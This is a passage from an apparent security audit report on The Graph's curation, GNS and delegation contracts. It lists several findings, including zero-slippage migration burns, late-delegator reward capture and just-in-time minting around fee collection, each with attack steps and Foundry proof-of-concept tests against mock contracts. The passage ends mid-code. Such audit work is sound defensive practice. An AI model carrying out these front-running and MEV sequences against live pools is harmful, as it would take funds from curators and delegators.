### Finding Status Justification: The in-scope L2GNS override exists and intentionally removes the base GNS pre-curation check. When nSignal is nonzero it burns all current vSignal with min 0, charges owner tax, then calls curation.mint(_subgraphDeploymentID, tokensWithTax, 0). L2Curation._tokensToSignal for an existing pool computes totalSignal * tokensIn / poolTokens, which can round to zero when pool tokens per signal is high. Because L2GNS accepts zero output, subgraphData.vSignal can become 0 while nSignal remains unchanged. GNS.nSignalToVSignal then returns vSignal * nSignalIn / totalNSignal, i.e. zero, and burnSignal calls curation().burn(..., 0, ...) which reverts due to L2Curation’s require(_signalIn != 0). No slippage or nonzero-output safeguard is shown. The call requires subgraph owner authorization, but subgraph owners are normal protocol actors, not globally trusted privileged roles, and this is not merely victim parameter misuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
L2GNS removes the base GNS pre-curation check and upgrades by burning all old version signal, then minting into the new deployment with a zero minimum output. Vulnerable snippet: `uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... (subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);`. In L2Curation, an existing pool mints `getCurationPoolSignal(id) * tokensIn / curationPool.tokens`; if the target pool has accumulated enough fees or otherwise has a high tokens-per-signal ratio, this rounds to zero. The upgrade still succeeds, sets `subgraphData.vSignal = 0`, and leaves `subgraphData.nSignal` unchanged. Later `burnSignal()` converts any curator's nSignal to vSignal as `vSignal * nSignal / totalNSignal = 0`, so the downstream curation burn reverts on zero signal and curators cannot redeem the outstanding name signal.

## Impact
A subgraph owner can redirect the GRT backing existing curators' name signal into a pre-existing high-ratio deployment while minting zero GNS-owned version signal. Curators' nSignal remains outstanding but becomes economically unredeemable, causing direct loss/freezing of the curated GRT backing the subgraph; if the subgraph has more than $1M of curated value, this matches the program's high-value user-fund-loss class.

## Proof of Concept
1. A subgraph has positive nSignal and vSignal from curator deposits. 2. The subgraph owner selects a new deployment whose L2Curation pool is already curated and has a very high tokens-per-signal ratio, for example from accumulated collected fees. 3. The owner calls `publishNewVersion(subgraphID, highRatioDeployment, metadata)`. 4. L2GNS burns all old vSignal for GRT and calls `curation.mint(highRatioDeployment, tokensWithTax, 0)`. 5. L2Curation rounds signal output to zero, but the zero min-out accepts it. 6. L2GNS stores `vSignal = 0` while `nSignal > 0`; all curator withdrawals later revert or return no redeemable version signal.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import 'forge-std/Test.sol';

contract MockCuration {
    mapping(bytes32 => uint256) public poolTokens;
    mapping(bytes32 => uint256) public poolSignal;
    function seed(bytes32 id, uint256 tokens, uint256 signal) external { poolTokens[id] = tokens; poolSignal[id] = signal; }
    function burn(bytes32 id, uint256 signalIn, uint256) external returns (uint256 tokensOut) {
        tokensOut = poolTokens[id] * signalIn / poolSignal[id];
        poolTokens[id] -= tokensOut;
        poolSignal[id] -= signalIn;
    }
    function mint(bytes32 id, uint256 tokensIn, uint256 signalOutMin) external returns (uint256 signalOut, uint256) {
        signalOut = poolSignal[id] == 0 ? tokensIn : poolSignal[id] * tokensIn / poolTokens[id];
        require(signalOut >= signalOutMin, 'min');
        poolTokens[id] += tokensIn;
        poolSignal[id] += signalOut;
    }
}

contract L2GNSPublishHarness {
    struct SubgraphData { bytes32 deployment; uint256 vSignal; uint256 nSignal; }
    mapping(uint256 => SubgraphData) internal subgraphs;
    MockCuration public curation;
    constructor(MockCuration c) { curation = c; }
    function init(uint256 id, bytes32 deployment, uint256 vSignal, uint256 nSignal) external { subgraphs[id] = SubgraphData(deployment, vSignal, nSignal); }
    function publishNewVersion(uint256 id, bytes32 newDeployment) external {
        SubgraphData storage s = subgraphs[id];
        if (s.nSignal != 0) {
            uint256 tokens = curation.burn(s.deployment, s.vSignal, 0);
            (s.vSignal,) = curation.mint(newDeployment, tokens, 0);
        }
        s.deployment = newDeployment;
    }
    function vSignalOf(uint256 id) external view returns (uint256) { return subgraphs[id].vSignal; }
    function nSignalOf(uint256 id) external view returns (uint256) { return subgraphs[id].nSignal; }
}

contract L2GNSPublishNewVersionZeroSignalTest is Test {
    function test_publishNewVersion_acceptsZeroSignalAndBricksCurators() external {
        MockCuration c = new MockCuration();
        L2GNSPublishHarness gns = new L2GNSPublishHarness(c);
        bytes32 oldDeployment = keccak256('old');
        bytes32 highRatioDeployment = keccak256('high-ratio');
        uint256 subgraphID = 1;
        c.seed(oldDeployment, 100 ether, 100 ether);
        c.seed(highRatioDeployment, 1_000_000 ether, 1);
        gns.init(subgraphID, oldDeployment, 100 ether, 100 ether);
        gns.publishNewVersion(subgraphID, highRatioDeployment);
        assertEq(gns.vSignalOf(subgraphID), 0);
        assertGt(gns.nSignalOf(subgraphID), 0);
    }
}

## Suggested Mitigation
Add user/protocol slippage protection to L2 upgrades. Require the newly minted `vSignal` to be nonzero and above a caller-specified or protocol-computed minimum, and apply the same rounding-error guard used by L1 bridge minting before accepting the upgrade. Consider restoring the base GNS restriction against upgrading to pre-curated deployments unless the migration can prove existing nSignal remains redeemably backed.
```

### H-45 / `GhuG5LBZRxCkptR7_jsC-`
- Finding title: Zero-slippage curation burns let MEV force losses during L1GNS lifecycle migrations
- Report lines: 4772-4855
```md
## [H-45]. Zero-slippage curation burns let MEV force losses during L1GNS lifecycle migrations

## id: GhuG5LBZRxCkptR7_jsC-

## Derived From Pattern/Invariant
FlashLoanEconomicManipulation

## Exploit Type
FlashLoanEconomicManipulation

## Location
L1GNS.deprecateSubgraph / publishNewVersion / sendSubgraphToL2

## Finding Status: Valid
### Finding Status Justification: The root cause exists in the provided production source: deprecateSubgraph, sendSubgraphToL2, and publishNewVersion route whole subgraph curation positions through curation.burn(..., 0), with publishNewVersion also calling curation.mint(..., 0). There is no caller-supplied minimum output for these lifecycle operations. The functions are owner-triggered, but the manipulation leg is permissionless and does not require admin, leaked keys, or trusted-role abuse. The behavior is not documented as an accepted MEV risk. Existing code provides no complete safeguard against execution at manipulated curation prices.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L1GNS/GNS moves an entire subgraph curation position through the external Curation market with hard-coded zero minimum outputs. Vulnerable snippets: `curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0)` in `deprecateSubgraph()` and `sendSubgraphToL2()`, plus `curation.burn(..., 0)` and `curation.mint(..., 0)` in `publishNewVersion()`. Unlike user-facing `mintSignal()` and `burnSignal()`, which expose `_nSignalOutMin` / `_tokensOutMin`, these owner-triggered whole-pool lifecycle operations accept any Curation output. A permissionless curation trader can front-run or atomically manipulate the deployment's curation state before the owner transaction and make all curators accept a materially worse burn/migration price.

## Impact
If a high-value subgraph has significant GRT curated, a MEV trader can extract or destroy value from the full subgraph curation position during deprecation, L2 transfer, or version publication. This can cause significant user funds to be lost directly from the protocol curation/GNS accounting, bounded by the value of the subgraph's curated GRT.

## Proof of Concept
1. A subgraph has a large `vSignal` / `nSignal` balance backing many curators. 2. The owner submits `deprecateSubgraph()`, `sendSubgraphToL2()`, or `publishNewVersion()`. 3. An MEV trader sees the transaction and manipulates the old deployment's Curation spot state before it executes. 4. L1GNS calls `curation.burn(..., 0)` and accepts the manipulated low token output. 5. `withdrawableGRT` or bridged/migrated tokens are recorded using the bad output, socializing the loss across curators while the trader unwinds the manipulation.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockCuration {
    uint256 public burnRateBps = 10000;
    function setBurnRateBps(uint256 bps) external { burnRateBps = bps; }
    function burn(bytes32, uint256 amount, uint256 minOut) external view returns (uint256 out) {
        out = amount * burnRateBps / 10000;
        require(out >= minOut, "slippage");
    }
}

contract GNSNoSlippageHarness {
    struct SubgraphData { bytes32 deployment; uint256 vSignal; uint256 nSignal; uint256 withdrawableGRT; bool disabled; address owner; }
    mapping(uint256 => SubgraphData) public subgraphs;
    MockCuration public curation;
    constructor(MockCuration c) { curation = c; }
    function seed(uint256 id, address owner, bytes32 deployment, uint256 signal) external {
        subgraphs[id] = SubgraphData(deployment, signal, signal, 0, false, owner);
    }
    function deprecateSubgraph(uint256 id) external {
        SubgraphData storage s = subgraphs[id];
        require(msg.sender == s.owner, "auth");
        if (s.nSignal != 0) {
            s.withdrawableGRT = curation.burn(s.deployment, s.vSignal, 0);
        }
        s.disabled = true;
        s.vSignal = 0;
    }
}

contract L1GNSZeroSlippagePoC is Test {
    function testMEVCanForceLifecycleOperationToAcceptBadCurationOutput() external {
        address owner = address(0xA11CE);
        MockCuration c = new MockCuration();
        GNSNoSlippageHarness gns = new GNSNoSlippageHarness(c);
        uint256 id = 1;
        uint256 curatedValue = 1_000_000 ether;
        gns.seed(id, owner, keccak256("oldDeployment"), curatedValue);

        c.setBurnRateBps(100); // attacker-manipulated 1% output accepted because minOut is hard-coded to 0
        vm.prank(owner);
        gns.deprecateSubgraph(id);

        (, , , uint256 withdrawableGRT,,) = gns.subgraphs(id);
        assertEq(withdrawableGRT, 10_000 ether);
        assertGt(curatedValue - withdrawableGRT, 990_000 ether);
    }
}

## Suggested Mitigation
Add explicit slippage parameters and deadlines to owner lifecycle functions, such as minimum burn output and minimum minted signal for `publishNewVersion()`, `deprecateSubgraph()`, and `sendSubgraphToL2()`. Revert if Curation output is below the caller-supplied bound, or use a multi-block/TWAP protected migration mechanism for whole-pool moves.
```

### H-48 / `hPmA41X7Gv-5BNaMRzCSj`
- Finding title: Late delegator can front-run SubgraphService.collect and capture historical indexing rewards
- Report lines: 5150-5190
```md
## [H-48]. Late delegator can front-run SubgraphService.collect and capture historical indexing rewards

## id: hPmA41X7Gv-5BNaMRzCSj

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
SubgraphService.collect(IndexingRewards)

## Finding Status: Valid
### Finding Status Justification: The described path exists in the provided production SubgraphService/AllocationManager code. collect(IndexingRewards) reaches _collectIndexingRewards(), which calls _presentPoi(), then _distributeIndexingRewards(). That function reads the current HorizonStaking delegation fee cut and live getDelegationPool(indexer,address(this)); if pool.shares > 0 it sends the delegator cut into the current delegation pool with addToDelegationPool. No allocation-level delegation snapshot, accrual-time user index, or reward debt is shown. Therefore a delegator entering before collection can participate in rewards accrued before entry, and if prior pool.shares was zero, making shares positive changes the split from zero delegator rewards to delegatorCut. The target files are explicitly in scope. No complete safeguard or explicit accepted-risk documentation is provided. Exploitation uses public delegation mechanics plus an authorized collect transaction, not privileged abuse by the attacker, user mistake, or a future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Indexing rewards accrued by an allocation are distributed to the delegation pool using the live delegation pool at collection time. Vulnerable snippet in `AllocationManager._distributeIndexingRewards`: `pool = _graphStaking().getDelegationPool(_allocation.indexer, address(this)); tokensDelegationRewards = pool.shares > 0 ? _rewardsCollected.mulPPM(delegatorCut) : 0; ... _graphStaking().addToDelegationPool(_allocation.indexer, address(this), tokensDelegationRewards);`. There is no allocation-level snapshot of delegator shares and no reward debt preventing a new delegator from sharing rewards accrued before they delegated. If `pool.shares` was zero during accrual, a dust delegation immediately before collection can also switch the entire delegator cut on and divert rewards that otherwise would have gone to the indexer.

## Impact
Historical indexing rewards can be redirected to a short-term delegator instead of long-term delegators or the indexer. The loss is bounded by the delegator cut on collected indexing rewards and can be repeated around large reward collections.

## Proof of Concept
1. An allocation accrues indexing rewards over time while the attacker has no delegation to the indexer. 2. The attacker monitors for, or predicts, an authorized `collect(IndexingRewards)` call. 3. Immediately before collection, the attacker delegates enough GRT to create or dominate current delegation pool shares. 4. `collect` calls `_distributeIndexingRewards`, reads the live pool, and sends the historical delegator cut to the current delegation pool. 5. The attacker later withdraws or realizes the inflated pool value, capturing rewards from a period where they provided no delegation.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockStaking { struct DelegationPool { uint256 shares; } mapping(address => DelegationPool) public pools; mapping(address => mapping(address => uint256)) public sharesOf; mapping(address => uint256) public accRewardPerShare; function delegate(address indexer, uint256 amount) external { sharesOf[indexer][msg.sender] += amount; pools[indexer].shares += amount; } function getDelegationFeeCut(address, address, uint8) external pure returns (uint256) { return 500_000; } function getDelegationPool(address indexer, address) external view returns (DelegationPool memory) { return pools[indexer]; } function addToDelegationPool(address indexer, address, uint256 amount) external { require(pools[indexer].shares > 0); accRewardPerShare[indexer] += amount * 1e18 / pools[indexer].shares; } function claimable(address indexer, address user) external view returns (uint256) { return sharesOf[indexer][user] * accRewardPerShare[indexer] / 1e18; } }
contract VulnerableIndexingRewardService { MockStaking public staking; constructor(MockStaking s) { staking = s; } function collectIndexingRewards(address indexer, uint256 rewardsCollected) external { uint256 delegatorCut = staking.getDelegationFeeCut(indexer, address(this), 1); MockStaking.DelegationPool memory pool = staking.getDelegationPool(indexer, address(this)); uint256 tokensDelegationRewards = pool.shares > 0 ? rewardsCollected * delegatorCut / 1_000_000 : 0; if (tokensDelegationRewards > 0) staking.addToDelegationPool(indexer, address(this), tokensDelegationRewards); } }
contract LateDelegatorFreeRidePoC is Test { function testLateDelegatorCapturesHistoricalIndexingRewards() public { address indexer = address(0x1); address attacker = address(0xA11CE); MockStaking staking = new MockStaking(); VulnerableIndexingRewardService service = new VulnerableIndexingRewardService(staking); vm.prank(attacker); staking.delegate(indexer, 1 ether); service.collectIndexingRewards(indexer, 1_000_000 ether); assertEq(staking.claimable(indexer, attacker), 500_000 ether); assertGt(staking.claimable(indexer, attacker), 0); } }

## Suggested Mitigation
Snapshot delegation shares or delegated stake for each allocation reward accrual period, and distribute rewards according to that snapshot. Alternatively, update per-user reward debt on delegate/undelegate so new shares are not entitled to rewards accrued before entry, and preserve the indexer share when the pool had no eligible shares during the accrual window.
```

### H-52 / `LvSXBtfhMrPaWyLPL5LsI`
- Finding title: Zero-min curation remint lets MEV sandwich GNS upgrades and extract curator value
- Report lines: 5357-5434
```md
## [H-52]. Zero-min curation remint lets MEV sandwich GNS upgrades and extract curator value

## id: LvSXBtfhMrPaWyLPL5LsI

## Derived From Pattern/Invariant
FlashLoanEconomicManipulation

## Exploit Type
FlashLoanEconomicManipulation

## Location
GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: The publishNewVersion code exists and, when nSignal is nonzero, burns all old deployment vSignal with curation.burn(..., 0), charges owner tax, then mints into the new deployment with curation.mint(..., 0). The old-deployment burn accepts any token output and is exposed to public curation market state. No minimum burn output, minimum minted signal, deadline, or price check is present. The pre-curation guard may prevent pre-minting the new deployment, but it does not protect the old-deployment burn leg, so the root cause remains live.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
publishNewVersion() migrates all name-pool vSignal from the old deployment into a new deployment using the live Curation bonding-curve price and passes zero slippage bounds to both legs. Vulnerable snippet: uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... (subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);. A permissionless searcher can manipulate the old deployment's curation price immediately before the owner upgrade executes, force the GNS burn to accept a depressed token amount, then unwind after the upgrade. Because the whole curator pool is migrated with minOut=0, name curators receive fewer tokens/signal in the new deployment while the attacker captures the price movement.

## Impact
For subgraphs with large curated value, a sandwich or flash-loan manipulation around an owner upgrade can transfer significant GRT value from name curators to the attacker. If the affected pool exceeds $1M, this matches the program's High economic-loss impact.

## Proof of Concept
1. A subgraph has substantial nSignal/vSignal backed by the Curation bonding curve. 2. The subgraph owner submits publishNewVersion() to migrate to a new deployment. 3. A permissionless searcher observes the transaction and manipulates the old deployment's spot curation price in the same block. 4. The owner transaction executes curation.burn(oldDeployment, vSignal, 0) and accepts the manipulated low token output, then executes curation.mint(newDeployment, tokensWithTax, 0) with no lower bound. 5. The searcher unwinds the manipulation, keeping the extracted value while all GNS name curators are left with less backing in the new deployment.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract MockCuration {
    uint256 public oldBurnPrice = 1e18;
    uint256 public newMintPrice = 1e18;
    function setOldBurnPrice(uint256 p) external { oldBurnPrice = p; }
    function burn(bytes32, uint256 vSignal, uint256 minOut) external view returns (uint256 tokens) {
        tokens = vSignal * oldBurnPrice / 1e18;
        require(tokens >= minOut);
    }
    function mint(bytes32, uint256 tokens, uint256 minOut) external view returns (uint256 vSignal, uint256 tax) {
        vSignal = tokens * 1e18 / newMintPrice;
        require(vSignal >= minOut);
        tax = 0;
    }
}
contract VulnerableGNS {
    MockCuration public c;
    bytes32 public dep = bytes32(uint256(1));
    uint256 public vSignal = 1_000_000 ether;
    constructor(MockCuration _c) { c = _c; }
    function quoteUpgrade() external view returns (uint256) {
        uint256 tokens = vSignal * c.oldBurnPrice() / 1e18;
        return tokens * 1e18 / c.newMintPrice();
    }
    function publishNewVersion(bytes32 newDep) external {
        uint256 tokens = c.burn(dep, vSignal, 0);
        (uint256 newSignal,) = c.mint(newDep, tokens, 0);
        vSignal = newSignal;
        dep = newDep;
    }
}
contract GNSPublishNewVersionPOC is Test {
    function testZeroMinUpgradeAcceptsManipulatedPrice() public {
        MockCuration c = new MockCuration();
        VulnerableGNS g = new VulnerableGNS(c);
        uint256 fair = g.quoteUpgrade();
        c.setOldBurnPrice(1e16);
        g.publishNewVersion(bytes32(uint256(2)));
        assertGt(fair, 900_000 ether);
        assertLt(g.vSignal(), fair / 50);
    }
}

## Suggested Mitigation
Add slippage parameters to publishNewVersion(), e.g. minimum tokens returned from the old curation burn and minimum vSignal minted on the new deployment. Apply the checks to the exact live outputs, and consider a commit/reveal or bounded TWAP-style price check for large migrations.
```

### M-53 / `sy0gIS3xnXU4griUAX-Vq`
- Finding title: Late delegators can front-run reward distribution and capture historical delegation rewards
- Report lines: 5435-5524
```md
## [M-53]. Late delegators can front-run reward distribution and capture historical delegation rewards

## id: sy0gIS3xnXU4griUAX-Vq

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
StakingExtension.delegate

## Finding Status: Valid
### Finding Status Justification: The finding matches the provided in-scope staking code. delegate() is implemented in StakingExtension and mints immediately usable shares based only on the current pool token/share ratio. Both _collectDelegationQueryRewards and _collectDelegationIndexingRewards add newly distributed delegation rewards to the same live pool.tokens balance. The code has no allocation-time share snapshot, rewardDebt, userRewardPerTokenPaid, activation delay, or exclusion for shares minted shortly before distribution. The preconditions are realistic whenever rewards are pending and an indexer is staked. Exploitation is permissionless and current, with no reliance on privileged compromise or pure user error.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are added to the current delegation pool balance at collection or allocation close time, but users who join immediately before that distribution receive shares and participate in the whole reward. The vulnerable share minting in _delegate uses only the live pool ratio: uint256 shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens); pool.tokens = pool.tokens.add(delegatedTokens); pool.shares = pool.shares.add(shares). Later, historical rewards are credited to the same live pool: _collectDelegationQueryRewards and _collectDelegationIndexingRewards both do pool.tokens = pool.tokens.add(delegationRewards). There is no per-user rewardDebt, userRewardPerTokenPaid, holding period, or allocation-time snapshot, so a large late delegator can buy into already-accrued but not-yet-distributed rewards.

## Impact
Long-term delegators who supplied delegation during the allocation or query-fee accrual period can have their accrued rewards diluted and transferred to a short-term late joiner. With large pending allocation rewards or query fee collections, this can produce direct monetary loss of rewards for existing delegators and corresponding gain for the attacker.

## Proof of Concept
1. Existing delegators hold shares in an indexer's delegation pool while an allocation accrues indexing rewards or query fees wait to be collected. 2. The attacker observes a pending collect() or closeAllocation() transaction that will credit delegationRewards to pool.tokens. 3. The attacker front-runs with a large delegate(indexer, amount), receiving shares at the pre-reward pool price. 4. The reward distribution executes and increases pool.tokens for all current shares. 5. The attacker owns most shares during the distribution and captures most of the historical reward. 6. The attacker exits by undelegating after the required delay, or by migrating delegation to L2 when the indexer is eligible.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract DelegationPoolModel {
    uint256 public tokens;
    uint256 public shares;
    mapping(address => uint256) public sharesOf;

    function seed(address user, uint256 amount) external {
        require(shares == 0);
        tokens = amount;
        shares = amount;
        sharesOf[user] = amount;
    }

    function delegate(address user, uint256 amount) external returns (uint256 mintedShares) {
        mintedShares = tokens == 0 ? amount : amount * shares / tokens;
        require(mintedShares > 0);
        tokens += amount;
        shares += mintedShares;
        sharesOf[user] += mintedShares;
    }

    function distributeDelegationRewards(uint256 reward) external {
        tokens += reward;
    }

    function valueOf(address user) external view returns (uint256) {
        return sharesOf[user] * tokens / shares;
    }
}

contract LateDelegatorRewardPoC is Test {
    DelegationPoolModel pool;
    address alice = address(0xA11CE);
    address attacker = address(0xB0B);

    function setUp() public {
        pool = new DelegationPoolModel();
    }

    function testLateJoinerCapturesHistoricalReward() public {
        pool.seed(alice, 1000 ether);
        pool.delegate(attacker, 9000 ether);
        pool.distributeDelegationRewards(100 ether);

        uint256 aliceValue = pool.valueOf(alice);
        uint256 attackerValue = pool.valueOf(attacker);

        assertEq(aliceValue, 1010 ether);
        assertEq(attackerValue - 9000 ether, 90 ether);
        assertEq((1000 ether + 100 ether) - aliceValue, 90 ether);
        assertGt(attackerValue, 9000 ether);
    }
}

## Suggested Mitigation
Checkpoint rewards per delegator. Track a per-pool reward index and per-user rewardDebt/userRewardPerTokenPaid so new shares only accrue rewards after deposit. For allocation rewards, snapshot eligible delegation shares at allocation creation or reward accrual boundaries, or enforce a minimum holding period before new shares can receive already-accrued rewards.
```

### H-59 / `LW2vZUmlgJ660REGRS4O7`
- Finding title: Just-in-time minting before Curation.collect lets attackers siphon pending query-fee reserves
- Report lines: 5852-5982
```md
## [H-59]. Just-in-time minting before Curation.collect lets attackers siphon pending query-fee reserves

## id: LW2vZUmlgJ660REGRS4O7

## Derived From Pattern/Invariant
AccountingInvariantViolation: collected fees are assigned to live curation signal instead of a pre-collection snapshot

## Exploit Type
FrontrunMev

## Location
Curation.collect

## Finding Status: Valid
### Finding Status Justification: The vulnerable mechanics are present in the provided in-scope Curation.sol. collect() adds fee tokens to pool reserves without any eligibility snapshot or per-holder fee accounting. mint() is permissionless and immediately increases both reserve accounting and the caller's GCS balance. burn() is also permissionless for owned signal and uses signalToTokens(), which prices against the post-collect reserve. Thus, the stated flow of minting before a pending collect and burning after it matches the code. Slippage checks protect the caller from bad pricing but do not prevent the exploit path. _updateRewards() notifies RewardsManager on mint/burn, but collect() itself does not call it and no shown logic excludes new signal from collected-fee reserves. The issue is in production scope, not explicitly accepted by docs, currently executable with public functions and normal staking collection, and does not depend on user mistake, privileged key compromise, or future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Curation.collect() increases a pool's token reserves without minting new GCS and without snapshotting which curators were eligible before the fee collection. Because mint() is permissionless, an attacker can see a pending collect() transaction, mint signal into the same pool immediately before it, receive a live share of the pool, then burn immediately after collect() to withdraw a proportional share of fees that were earned before the attacker joined.

Vulnerable snippets:
function collect(bytes32 _subgraphDeploymentID, uint256 _tokens) external override {
    require(msg.sender == address(staking()), "Caller must be the staking contract");
    require(isCurated(_subgraphDeploymentID), "Subgraph deployment must be curated to collect fees");
    CurationPool storage curationPool = pools[_subgraphDeploymentID];
    curationPool.tokens = curationPool.tokens.add(_tokens);
}

function mint(...) external override notPartialPaused returns (uint256, uint256) {
    ...
    curationPool.tokens = curationPool.tokens.add(_tokensIn.sub(curationTax));
    curationPool.gcs.mint(curator, signalOut);
}

The reserve increase is distributed to whoever holds GCS at execution time rather than to the signal holders that existed before the collected query fees became known.

## Impact
A searcher can steal a material share of query-fee GRT from incumbent curators. For large fee-collection batches, this can become a significant direct loss of user funds held in the Curation contract, limited primarily by attacker capital and curation tax.

## Proof of Concept
1. A pool has incumbent curators with existing GCS and a pending staking collect(subgraphId, feeAmount) transaction is visible.
2. The attacker front-runs collect() with mint(subgraphId, largeAmount, lowEnoughMin), receiving newly minted GCS before fees are added.
3. The staking collect() transaction executes and adds feeAmount to pool.tokens without taking an eligibility snapshot.
4. The attacker back-runs with burn(subgraphId, attackerSignal, 0).
5. The burn returns the attacker's deposit plus a proportional share of the newly collected fees, reducing the fee value that should have accrued to incumbent curators.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract CurationModel {
    uint256 constant MAX_PPM = 1_000_000;
    uint256 public taxPpm = 10_000; // 1% curation tax
    address public staking;

    struct Pool {
        uint256 tokens;
        uint256 totalSignal;
    }

    mapping(bytes32 => Pool) public pools;
    mapping(address => mapping(bytes32 => uint256)) public signal;

    constructor(address _staking) {
        staking = _staking;
    }

    function seed(bytes32 id, uint256 tokens, uint256 totalSignal, address incumbent) external {
        pools[id] = Pool(tokens, totalSignal);
        signal[incumbent][id] = totalSignal;
    }

    function mint(bytes32 id, uint256 tokensIn) external returns (uint256 signalOut) {
        Pool storage p = pools[id];
        uint256 tax = (tokensIn * taxPpm) / MAX_PPM;
        uint256 net = tokensIn - tax;
        signalOut = (p.totalSignal * net) / p.tokens;
        p.tokens += net;
        p.totalSignal += signalOut;
        signal[msg.sender][id] += signalOut;
    }

    function collect(bytes32 id, uint256 amount) external {
        require(msg.sender == staking, "only staking");
        pools[id].tokens += amount;
    }

    function burn(bytes32 id, uint256 signalIn) external returns (uint256 tokensOut) {
        Pool storage p = pools[id];
        require(signal[msg.sender][id] >= signalIn, "not enough signal");
        tokensOut = (p.tokens * signalIn) / p.totalSignal;
        signal[msg.sender][id] -= signalIn;
        p.totalSignal -= signalIn;
        p.tokens -= tokensOut;
    }
}

contract CurationCollectFrontrunTest is Test {
    function testFrontrunCollectStealsPendingFees() public {
        bytes32 id = keccak256("subgraph");
        address incumbent = address(0x1);
        address attacker = address(0x2);
        address staking = address(0x3);

        CurationModel c = new CurationModel(staking);
        c.seed(id, 100_000 ether, 100_000 ether, incumbent);

        uint256 attackerCost = 100_000 ether;

        vm.prank(attacker);
        uint256 attackerSignal = c.mint(id, attackerCost);

        vm.prank(staking);
        c.collect(id, 100_000 ether);

        vm.prank(attacker);
        uint256 attackerOut = c.burn(id, attackerSignal);

        assertGt(attackerOut, attackerCost, "attacker profits after tax");
        assertGt(attackerOut - attackerCost, 48_000 ether, "attacker captures pending fees");
    }
}

## Suggested Mitigation
Do not assign collected fees to live, same-block signal. Snapshot eligible total signal before fee collection and accrue fees through a reward index based only on pre-existing GCS, or enforce an epoch/delay so newly minted signal is ineligible for already pending collect() amounts. Another option is to route collections through RewardsManager-style checkpointing before reserves are increased, then make burn() claim only the caller's checkpointed entitlement.
```

### H-61 / `HQ5iIK4DLrc3zk9gdqq70`
- Finding title: Just-in-time curation around Curation.collect lets MEV searchers steal query-fee reserve increases from existing curators
- Report lines: 6041-6154
```md
## [H-61]. Just-in-time curation around Curation.collect lets MEV searchers steal query-fee reserve increases from existing curators

## id: HQ5iIK4DLrc3zk9gdqq70

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
Curation.mint/collect/burn

## Finding Status: Valid
### Finding Status Justification: This is the same live-share accounting issue in in-scope Curation.sol. collect() only requires the staking contract as caller and an already curated pool, then increases curationPool.tokens. It does not mint offsetting GCS, record a pre-fee totalSupply snapshot, checkpoint fee entitlement, or prevent same-block mint/burn. mint() and burn() are public permissionless paths guarded only by pause and slippage checks. Because burn() prices redemption from current pool.tokens and current GCS supply, a holder who mints before collect() can redeem a pro-rata portion of the reserve increase after collect(). No complete safeguard in the provided code blocks this exact MEV ordering. The risk is not expressly documented as intentional, and it does not require a privileged or compromised actor; the staking collect is a normal protocol call, while the attacker only uses public functions.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Curation.collect() immediately adds newly collected query fees to the pool reserve without snapshotting the GCS holders that earned those fees. Because mint() and burn() are permissionless and GCS can be minted and burned with no holding period, a searcher can mint immediately before a visible staking collect() transaction, let collect() increase reserves, then burn immediately after to withdraw a pro-rata share of the newly collected fees.

Vulnerable snippet:
function collect(bytes32 _subgraphDeploymentID, uint256 _tokens) external override {
    require(msg.sender == address(staking()), "Caller must be the staking contract");
    require(isCurated(_subgraphDeploymentID), "Subgraph deployment must be curated to collect fees");
    CurationPool storage curationPool = pools[_subgraphDeploymentID];
    curationPool.tokens = curationPool.tokens.add(_tokens);
    emit Collected(_subgraphDeploymentID, _tokens);
}

The collected tokens are treated as generic bonding-curve reserves, so any signal holder at processing time can redeem them through burn(), regardless of whether they held signal while the query fees accrued.

## Impact
Existing curators can lose a large fraction of collected query fees to just-in-time minters. For large fee collections, a searcher with sufficient capital or builder ordering can extract significant GRT directly from Curation pool reserves, diluting long-term curators and redirecting protocol fee value.

## Proof of Concept
1. Alice is the only existing curator in a pool with 1000 GRT reserves and 1000 GCS.
2. A staking collect(pool, 1000 GRT) transaction is visible in the mempool.
3. Attacker front-runs with mint(pool, 9000 GRT), receiving 9000 GCS at the pre-collection price.
4. Staking collect executes and adds 1000 GRT to reserves without minting new GCS or snapshotting prior holders.
5. Attacker back-runs with burn(pool, 9000 GCS), receiving 9900 GRT.
6. Attacker profits 900 GRT, which is exactly value Alice would have received from the collected fees absent the just-in-time mint.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract LinearCurationHarness {
    struct Pool { uint256 tokens; uint256 supply; }
    mapping(bytes32 => Pool) public pools;
    mapping(bytes32 => mapping(address => uint256)) public balanceOf;

    function mint(bytes32 id, uint256 tokensIn) external returns (uint256 signalOut) {
        Pool storage p = pools[id];
        if (p.supply == 0) {
            signalOut = tokensIn;
        } else {
